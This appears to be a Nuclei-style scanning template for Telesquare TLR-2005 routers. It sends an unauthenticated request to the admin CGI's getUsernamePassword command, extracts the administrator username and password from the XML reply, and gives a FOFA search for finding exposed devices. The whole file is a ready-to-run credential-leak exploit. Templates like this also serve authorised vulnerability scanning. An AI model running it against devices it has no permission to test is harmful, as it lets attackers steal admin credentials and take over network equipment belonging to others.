id: telesquare-tlr2005-getusernamepassword-infoleak

info:
  name: telesquare-tlr2005-getusernamepassword-infoleak
  author: unknow
  severity: critical
  description: telesquare tlr2005 getusernamepassword存在账密信息泄露漏洞。
  tags: telesquare,infoleak
  metadata:
    fofa-query: title="TLR-2005KSH" || banner="TLR-2005KSH login:"

http:
  - raw:
      - |
        GET /cgi-bin/admin.cgi?Command=getUsernamePassword HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: username
        part: body
        regex:
          - "<admin_username>(.*)</admin_username>"

      - type: regex
        name: password
        part: body
        regex:
          - "<admin_password>(.*)</admin_password>"

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1==200 && contains(body_1, "</admin_username>") && contains(header_1, "text/xml")'